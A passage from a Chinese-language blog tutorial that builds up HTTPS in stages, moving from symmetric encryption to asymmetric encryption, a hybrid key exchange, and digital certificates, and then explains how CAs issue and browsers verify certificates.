href="/static/2021-07-15-15-02-41-784d9435ed003d4514d8d9e69e0672f9-0a2a7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 60.92124814264488%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsSAAALEgHS3X78AAAB5klEQVQoz5VS/0sUQRy9/60ofxFOLrjrjkvtC3VXeJRpP0Y/FBghBWVHii6C3m3Fpv0Sah0RFFGIlHpoWi6K3nZ6N7dfZ3Zn9jPt3u516g9B74dhYOZ93pt5L8LbAP6fiADwBoYGAc3h3qpicFtDwN8w+YDef+8Ml/QHC/WhEhGXHNcygDGfrGH3YlFPjCmxhyvx0UrmhVE33cAGxZjX9r7vkNgYio9sxYaXu/LVO29MhmqWvOmTdQL9M0a2iK4W9rNi49ZrA1kh2SWYmYb6bXEx0fGpu+tdOvol3rF6u58YOkW1UPn8tJYUUOxROTFeuyLqoTKEvve/fp6LnipGT092npztPPFxsM/2HPmH4CvfeKVnRTVbqGZEdXBWD5WBNx8PKwpLFkjPVD357OfZaetuyQ7+A5q23Zyke4KXhJ3Lon5z5hiZr/+mOckYkFBuajsnmY8/mH+z8ZWvPVe7J/YuCLs9QuW6pCELDpPLCjs3iXqF3d7x7dREdejtETLPFFEqv5nO/0iMbPS9VI+RVxWIjyqpp+vp/MaZJ1v35q022bvkZbsmK2tyRbVBI+2cA9gMDkxelqtLy7+UOmmQdp0iwRSHmJTgf5SJ2tixNO6yIw1rNSmsVLCnlJotYIybsYVW4ZCvP1bUc5AzLFuFAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 15 02 41" title="" data-src="/static/2021-07-15-15-02-41-784d9435ed003d4514d8d9e69e0672f9-fee1c.png" data-srcset="/static/2021-07-15-15-02-41-784d9435ed003d4514d8d9e69e0672f9-a67b7.png 200w,\n/static/2021-07-15-15-02-41-784d9435ed003d4514d8d9e69e0672f9-0b187.png 400w,\n/static/2021-07-15-15-02-41-784d9435ed003d4514d8d9e69e0672f9-fee1c.png 800w,\n/static/2021-07-15-15-02-41-784d9435ed003d4514d8d9e69e0672f9-b1a91.png 1200w,\n/static/2021-07-15-15-02-41-784d9435ed003d4514d8d9e69e0672f9-0a2a7.png 1346w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>从图中我们可以看出 HTTPS 并非是一个新的协议，通常 HTTP 直接和 TCP 通信，HTTPS 则先和安全层通信，然后安全层再和 TCP 层通信。也就是说 HTTPS 所有的安全核心都在安全层，它不会影响到上面的 HTTP 协议，也不会影响到下面的 TCP/IP，因此要搞清楚 HTTPS 是如何工作的，就要弄清楚安全层是怎么工作的。</p>\n<p>总的来说，安全层有两个主要的职责：对发起 HTTP 请求的数据进行加密操作和对接收到 HTTP 的内容进行解密操作</p>\n<p>我们知道了安全层最重要的就是加解密，那么接下来我们就利用这个安全层，一步一步实现一个从简单到复杂的 HTTPS 协议。</p>\n<h3 id="第一版：使用对称加密"><a href="#%E7%AC%AC%E4%B8%80%E7%89%88%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>第一版：使用对称加密</h3>\n<p>提到加密，最简单的方式是使用对称加密。所谓对称加密是指加密和解密都使用的是相同的密钥</p>\n<p>了解了对称加密，下面我们就使用对称加密来实现第一版的 HTTPS。</p>\n<p>要在两台电脑上加解密同一个文件，我们至少需要知道加解密方式和密钥，因此，在 HTTPS 发送数据之前，浏览器和服务器之间需要协商加密方式和密钥，过程如下所示：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-15-03-34-8672705f7e9dafeb99259b6f1be1cea5-09eb7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 48.24868651488617%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsSAAALEgHS3X78AAABz0lEQVQoz1WR62/aMBTF+e/7rUwtNDwTHkvoNBXUB6hs074NxqOQraqmFtqyQZo4ceKEEHuEJJ5DNk29Ojo6vvLPlq9TUURZqWjz8fOt0WzAi/fqmbSQhOW72kIUnkV+XiuqTQm2TjufbhUdss1RwlCaCvdpev/UOh9a9bwplY16AVRzoJpnrlU45qxp1vKNs8Hd7OkVnKQFQOeXY1DJGWJ5JXDPhaP5yeGcSz9y6Z+ljCHx7IhmW9Ys5zUce4gpve5+BwKni2XG62KJMYviMZR4Q4o7Kn9y9eEu2KP0X6UwJluCPUo77YmaS2t8VitnlOLRw5uD+/TBS+lYLWcAn1W4w4vON5/SLSEY491uF8OGYdjItElw3f/ljnqbySCRM+o54/9Ld9zvDBSX+DaygK57nhfDK0V5UVYadLqPoelTxLT7KzuI3fJjwS1tz0LouBoAy+USIRTDloU2G9cPaX5AKmNcH7v8VxRrYDMXhs7bCRanmB952d6GYtc2oapqeF/JwCiDC0NSu8HizZrvQ75vCn2TeXWIGjI+lXFtSnJfXCjLDgAqACaE6/U6+ecI+7Q7CywvtEnk/Kb2XklAOEzU+hHIOl2TgD2bjZld+Qe5awHv3ixsSAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 15 03 34" title="" data-src="/static/2021-07-15-15-03-34-8672705f7e9dafeb99259b6f1be1cea5-fee1c.png" data-srcset="/static/2021-07-15-15-03-34-8672705f7e9dafeb99259b6f1be1cea5-a67b7.png 200w,\n/static/2021-07-15-15-03-34-8672705f7e9dafeb99259b6f1be1cea5-0b187.png 400w,\n/static/2021-07-15-15-03-34-8672705f7e9dafeb99259b6f1be1cea5-fee1c.png 800w,\n/static/2021-07-15-15-03-34-8672705f7e9dafeb99259b6f1be1cea5-09eb7.png 1142w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>通过上图我们可以看出，HTTPS 首先要协商加解密方式，这个过程就是 HTTPS 建立安全连接的过程。为了让加密的密钥更加难以破解，我们让服务器和客户端同时决定密钥，具体过程如下：</p>\n<ul>\n<li>浏览器发送它所支持的加密套件列表和一个随机数 client-random，这里的加密套件是指加密的方法，加密套件列表就是指浏览器能支持多少种加密方法列表。</li>\n<li>服务器会从加密套件列表中选取一个加密套件，然后还会生成一个随机数 service-random，并将 service-random 和加密套件列表返回给浏览器。</li>\n<li>最后浏览器和服务器分别返回确认消息。</li>\n</ul>\n<p>这样浏览器端和服务器端都有相同的 client-random 和 service-random 了，然后它们再使用相同的方法将 client-random 和 service-random 混合起来生成一个密钥 master secret，有了密钥 master secret 和加密套件之后，双方就可以进行数据的加密传输了。</p>\n<p>通过将对称加密应用在安全层上，我们实现了第一个版本的 HTTPS，虽然这个版本能够很好地工作，但是其中传输 client-random 和 service-random 的过程却是明文的，这意味着黑客也可以拿到协商的加密套件和双方的随机数，由于利用随机数合成密钥的算法是公开的，所以黑客拿到随机数之后，也可以合成密钥，这样数据依然可以被破解，那么黑客也就可以使用密钥来伪造或篡改数据了。</p>\n<h3 id="第二版：使用非对称加密"><a href="#%E7%AC%AC%E4%BA%8C%E7%89%88%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>第二版：使用非对称加密</h3>\n<p>不过非对称加密能够解决这个问题，因此接下来我们就利用非对称加密来实现我们第二版的 HTTPS，不过在讨论具体的实现之前，我们先看看什么是非对称加密。</p>\n<p>和对称加密只有一个密钥不同，非对称加密算法有 A、B 两把密钥，如果你用 A 密钥来加密，那么只能使用 B 密钥来解密；反过来，如果你要 B 密钥来加密，那么只能用 A 密钥来解密</p>\n<p>在 HTTPS 中，服务器会将其中的一个密钥通过明文的形式发送给浏览器，我们把这个密钥称为公钥，服务器自己留下的那个密钥称为私钥。顾名思义，公钥是每个人都能获取到的，而私钥只有服务器才能知道，不对任何人公开。下图是使用非对称加密改造的 HTTPS 协议：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-15-04-25-9a18747ab923e11d4bd0b481a9705524-09eb7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 51.83887915936953%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsSAAALEgHS3X78AAABsklEQVQoz22N/0/aUBTF/evnftgWomLFls5CWwxgBg0hZUa2ackmG5WB26KMH9Yvkfa1tNLXlk58b6/VJW7h5uTknJv7yd3AZNDdpe4dN3qRJAKp7ko1p1nVDg+0Q86olkl1pbrXqLTa6kS30nOEH2YjtVXSVSct/m3I71o8A3jaKhVmB5TN7YHyPqlAYFyOOqop5+OrDEZPYHT3ZWpJJTko52cEFhiD3Z3u5Qx62+Iom6dtgXE4Smr0f5rgn89ZQjcxbovHUKAskQVikQC/mG2tmCc5VYUFHNVuqSF+yv6FjRA32NacfqkzOybBCrkfr55d5TYNeotUs7hjUi+kN58gWgebEMvycNXr3CrdQDlZnJ2472TvfYfkTF142pHPpvB+DYzNBWpe37tLrAVYJ1qkrmVuwEeRg/B39uo/eAbR89O4Olryw2VpANmP89K5X1Cc1/1b8WsikqUa5/tJssLr4ABtfohro1i4iMVhXFYh3XO4zwuSiSrpJt5SYPhttLwxnLnnAOD7/iNsQ5RTwub3qD6Oji6j+giKA686DEh+UG0cFQfJxcS33dA0dMdxCPUHg7b+FrFsVkAAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 15 04 25" title="" data-src="/static/2021-07-15-15-04-25-9a18747ab923e11d4bd0b481a9705524-fee1c.png" data-srcset="/static/2021-07-15-15-04-25-9a18747ab923e11d4bd0b481a9705524-a67b7.png 200w,\n/static/2021-07-15-15-04-25-9a18747ab923e11d4bd0b481a9705524-0b187.png 400w,\n/static/2021-07-15-15-04-25-9a18747ab923e11d4bd0b481a9705524-fee1c.png 800w,\n/static/2021-07-15-15-04-25-9a18747ab923e11d4bd0b481a9705524-09eb7.png 1142w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>根据该图，我们来分析下使用非对称加密的请求流程。</p>\n<ul>\n<li>首先浏览器还是发送加密套件列表给服务器。</li>\n<li>然后服务器会选择一个加密套件，不过和对称加密不同的是，使用非对称加密时服务器上需要有用于浏览器加密的公钥和服务器解密 HTTP 数据的私钥，由于公钥是给浏览器加密使用的，因此服务器会将加密套件和公钥一道发送给浏览器。</li>\n<li>最后就是浏览器和服务器返回确认消息。</li>\n</ul>\n<p>这样浏览器端就有了服务器的公钥，在浏览器端向服务器端发送数据时，就可以使用该公钥来加密数据。由于公钥加密的数据只有私钥才能解密，所以即便黑客截获了数据和公钥，他也是无法使用公钥来解密数据的。</p>\n<ul>\n<li>第一个是非对称加密的效率太低。这会严重影响到加解密数据的速度，进而影响到用户打开页面的速度。</li>\n<li>第二个是无法保证服务器发送给浏览器的数据安全。虽然浏览器端可以使用公钥来加密，但是服务器端只能采用私钥来加密，私钥加密只有公钥能解密，但黑客也是可以获取得到公钥的，这样就不能保证服务器端数据的安全了。</li>\n</ul>\n<h3 id="第三版：对称加密和非对称加密搭配使用"><a href="#%E7%AC%AC%E4%B8%89%E7%89%88%EF%BC%9A%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E5%92%8C%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>第三版：对称加密和非对称加密搭配使用</h3>\n<p>基于以上两点原因，我们最终选择了一个更加完美的方案，那就是在传输数据阶段依然使用对称加密，但是对称加密的密钥我们采用非对称加密来传输。下图就是改造后的版本：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-15-05-26-a80d8b27b0a88b0bc1ce1983c68748aa-09eb7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 61.90893169877408%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsSAAALEgHS3X78AAACLElEQVQoz1WR7VObQBDG8+871X4hSrQQMCZU8uZknNaXTtUZ+2K0akeLkDhtjUIg5HjJJRc4IEeP1FrdeW53v/zmud3NpfNAaAIcl8RJGgYpDp+L/FMQRqZpps8iRwihBXrgWNG/NffBxvJDaa1fXutvZNkor9kl1i2v2kVm71BVu7cvYPoyOk0UMzgQ6jq7cMu+/lnI9ItdfCgs6eyiUVjq5Re2939AhNK52SMchOHAtse+c2PhI7HhrDPG+mpfZPvrrCmuDMUVW1wZiMt9jtk91DKnF3AQ6Pc9W+9dG6gtvw9rnCeLo6owkgVfFpzNolcVR/WSK3F7R910Tj/lHC2zMUwTrA6io9KWt5E3eMbkGauYN4RlOkKPZwYSp/P57Q8KBeI4xlH06DydTocAIOjRmT+VWxOpMJR4R+JNkaUAqHC0d97ytsjufFSDOHYBgH0j86MwhFDrdPX73xT+XNtBTRE0K26zbMlFQ+JAo0R7d6sCquK7Ay0m2clijMlsNj9VFI0tawZdbRCd9HAQYBdif4xHKIIopk2mCXZguNuNXQfcqJqiqvTz85mThGCckkgxQ+Y0ad2mjc5fkYaWNjuZGhqRFCJ8j1OSANOCAPy/82y+P20YvzqeVs7hmy9use0L7ZHQ9vmvLn/ilS8QdzoptFEKDDwwp74fIETXlnta/p1HuLNp6wpunjm1C69+6dcuffncrZ67LWVSv0byFba6d7YFLNv2PA9j/AfAd2r/tyICGAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 15 05 26" title="" data-src="/static/2021-07-15-15-05-26-a80d8b27b0a88b0bc1ce1983c68748aa-fee1c.png" data-srcset="/static/2021-07-15-15-05-26-a80d8b27b0a88b0bc1ce1983c68748aa-a67b7.png 200w,\n/static/2021-07-15-15-05-26-a80d8b27b0a88b0bc1ce1983c68748aa-0b187.png 400w,\n/static/2021-07-15-15-05-26-a80d8b27b0a88b0bc1ce1983c68748aa-fee1c.png 800w,\n/static/2021-07-15-15-05-26-a80d8b27b0a88b0bc1ce1983c68748aa-09eb7.png 1142w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>从图中可以看出，改造后的流程是这样的：</p>\n<ul>\n<li>首先浏览器向服务器发送对称加密套件列表、非对称加密套件列表和随机数 client-random；</li>\n<li>服务器保存随机数 client-random，选择对称加密和非对称加密的套件，然后生成随机数 service-random，向浏览器发送选择的加密套件、service-random 和公钥；</li>\n<li>浏览器保存公钥，并利用 client-random 和 service-random 计算出来 pre-master，然后利用公钥对 pre-master 加密，并向服务器发送加密后的数据；</li>\n<li>最后服务器拿出自己的私钥，解密出 pre-master 数据，并返回确认消息。</li>\n</ul>\n<p>到此为止，服务器和浏览器就有了共同的 client-random、service-random 和 pre-master，然后服务器和浏览器会使用这三组随机数生成对称密钥，因为服务器和浏览器使用同一套方法来生成密钥，所以最终生成的密钥也是相同的。</p>\n<p>有了对称加密的密钥之后，双方就可以使用对称加密的方式来传输数据了。</p>\n<p>需要特别注意的一点，pre-master 是经过公钥加密之后传输的，所以黑客无法获取到 pre-master，这样黑客就无法生成密钥，也就保证了黑客无法破解传输过程中的数据了</p>\n<h3 id="第四版：添加数字证书"><a href="#%E7%AC%AC%E5%9B%9B%E7%89%88%EF%BC%9A%E6%B7%BB%E5%8A%A0%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>第四版：添加数字证书</h3>\n<p>通过对称和非对称混合方式，我们完美地实现了数据的加密传输。不过这种方式依然存在着问题，比如我要打开极客时间的官网，但是黑客通过 DNS 劫持将极客时间官网的 IP 地址替换成了黑客的 IP 地址，这样我访问的其实是黑客的服务器了，黑客就可以在自己的服务器上实现公钥和私钥，而对浏览器来说，它完全不知道现在访问的是个黑客的站点。</p>\n<p>所以我们还需要服务器向浏览器提供证明“我就是我”，那怎么证明呢？</p>\n<p>这里我们结合实际生活中的一个例子，比如你要买房子，首先你需要给房管局提交你买房的材料，包括银行流水、银行证明、身份证等，然后房管局工作人员在验证无误后，会发给你一本盖了章的房产证，房产证上包含了你的名字、身份证号、房产地址、实际面积、公摊面积等信息。</p>\n<p>在这个例子中，你之所以能证明房子是你自己的，是因为引进了房管局这个权威机构，并通过这个权威机构给你颁发一个证书</p>\n<p>对于浏览器来说，数字证书有两个作用：一个是通过数字证书向浏览器证明服务器的身份，另一个是数字证书里面包含了服务器公钥。</p>\n<p>接下来我们看看含有数字证书的 HTTPS 的请求流程，你可以参考下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-15-06-29-5aafb6136093b3ffc8d4ea9c809ab77f-09eb7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 71.62872154115587%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsSAAALEgHS3X78AAACfklEQVQoz12SWW/TQBRG89N546FFIiROW7LZsUmcplWpQBXlBarShSwla4GU1tm8ZXG8zozXYZJUUBh9ur4zmuMjWzcWRRHG2DL1B9mY/rhH3W92t+WQ9B4Du03Ya/mdhtwf9kUNORa5v6Fim8dcFU+/idd0RaKe3ye3hOTWILVNqkC9GFPbUmpbiz87o99+bIvWQv0L4/WKfFQTrPNcScnGh1lqkk8Ns0klT81yiWk2IWUSRu7lZfF9fWQH8InZdV1NW+LQbYzAl3x5wVAS81pmduXCnsLsqqvskK3BJM6L736ZKzCMNkYcM0xTlGRDm1UFq1E6Bvu5ZYXVK4VNjAprHLDaPovKmavK6Z35x7qGTdMcDAZzRSRmAjvljFbMLYtZbZ0pl5ly6UWZgXz6av/D/2Ychv5Sw4FbH4FLurJkUzL52mxSzVNKPjVIvxL24jKbMQrUJ/b4p06QEEDoB8EKVmR5NBqZ2uxmDOtvjuxSesHTGp8nQpneIXKjTM9LeVDcveRPerPAtfWZKCJVwb4XkxXle/9OX8MX3JHGZ2WeVnh6yOzdpZMTLqPytMQzein9mT+5nQXYhwgi33NX5sC27OkUe+BGdPsSwJ4dARtDGyOAXYihQ/qQnPhOcwS7MpLGQrPdmYjSekg8L3LJa/z6GNXE0PGiJcK6i0ndhPQaxMCPzgb+rYywtRQFwQPgcUg2f68p+9Q1OuhApqozNZ2tm1zDJLVQ07mGfdhF8QvwoEc4QCEhXfcfuKVGya/ooIvWsMHWLa5hEZipGtyNfdhzkzX/oT/BmmICaFmW4zhPYCVMXAFiLnfcJ0Gk8m1UaQOq6p231Lk0m64XGc3fWkTNKAOUX0cAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 15 06 29" title="" data-src="/static/2021-07-15-15-06-29-5aafb6136093b3ffc8d4ea9c809ab77f-fee1c.png" data-srcset="/static/2021-07-15-15-06-29-5aafb6136093b3ffc8d4ea9c809ab77f-a67b7.png 200w,\n/static/2021-07-15-15-06-29-5aafb6136093b3ffc8d4ea9c809ab77f-0b187.png 400w,\n/static/2021-07-15-15-06-29-5aafb6136093b3ffc8d4ea9c809ab77f-fee1c.png 800w,\n/static/2021-07-15-15-06-29-5aafb6136093b3ffc8d4ea9c809ab77f-09eb7.png 1142w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>相较于第三版的 HTTPS 协议，这里主要有两点改变：</p>\n<ul>\n<li>服务器没有直接返回公钥给浏览器，而是返回了数字证书，而公钥正是包含在数字证书中的；</li>\n<li>在浏览器端多了一个证书验证的操作，验证了证书之后，才继续后续流程。</li>\n</ul>\n<p>通过引入数字证书，我们就实现了服务器的身份认证功能，这样即便黑客伪造了服务器，但是由于证书是没有办法伪造的，所以依然无法欺骗用户。</p>\n<h2 id="数字证书的申请和验证"><a href="#%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%B3%E8%AF%B7%E5%92%8C%E9%AA%8C%E8%AF%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数字证书的申请和验证</h2>\n<p>在第四版的 HTTPS 中，我们提到过，有了数字证书，黑客就无法欺骗用户了，不过我们并没有解释清楚如何通过数字证书来证明用户身份，所以接下来我们再来把这个问题解释清楚。</p>\n<h3 id="如何申请数字证书"><a href="#%E5%A6%82%E4%BD%95%E7%94%B3%E8%AF%B7%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何申请数字证书</h3>\n<p>我们先来看看如何向 CA 申请证书。比如极客时间需要向某个 CA 去申请数字证书，通常的申请流程分以下几步：</p>\n<ul>\n<li>首先极客时间需要准备一套私钥和公钥，私钥留着自己使用；</li>\n<li>然后极客时间向 CA 机构提交公钥、公司、站点等信息并等待认证，这个认证过程可能是收费的；</li>\n<li>CA 通过线上、线下等多种渠道来验证极客时间所提供信息的真实性，如公司是否存在、企业是否合法、域名是否归属该企业等；</li>\n<li>如信息审核通过，CA 会向极客时间签发认证的数字证书，包含了极客时间的公钥、组织信息、CA 的信息、有效时间、证书序列号等，这些信息都是明文的，同时包含一个 CA 生成的签名。</li>\n</ul>\n<p>这样我们就完成了极客时间数字证书的申请过程。前面几步都很好理解，不过最后一步数字签名的过程还需要解释下：首先 CA 使用 Hash 函数来计算极客时间提交的明文信息，并得出信息摘要；然后 CA 再使用它的私钥对信息摘要进行加密，加密后的密文就是 CA 颁给极客时间的数字签名。这就相当于房管局在房产证上盖的章，这个章是可以去验证的，同样我们也可以通过数字签名来验证是否是该 CA 颁发的。</p>\n<h3 id="如何验证数字证书"><a href="#%E5%A6%82%E4%BD%95%E9%AA%8C%E8%AF%81%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何验证数字证书</h3>\n<p>有了 CA 签名过的数字证书，当浏览器向极客时间服务器发出请求时，服务器会返回数字证书给浏览器。</p>\n<p>浏览器接收到数字证书之后，会对数字证书进行验证。首先浏览器读取证书中相关的明文信息，采用 CA 签名时相同的 Hash 函数来计算并得到信息摘要 A；然后再利用对应 CA 的公钥解密签名数据，得到信息摘要 B；对比信息摘要 A 和信息摘要 B，如果一致，则可以确认证书是合法的，即证明了这个服务器是极客时间的；同时浏览器还会验证证书相关的域名信息、有效时间等信息。</p>\n<p>这时候相当于验证了 CA 是谁，但是这个 CA 可能比较小众，浏览器不知道该不该信任它，然后浏览器会继续查找给这个 CA 颁发证书的 CA，再以同样的方式验证它上级 CA 的可靠性。通常情况下，操作系统中会内置信任的顶级 CA 的证书信息（包含公钥），如果这个 CA 链中没有找到浏览器内置的顶级的 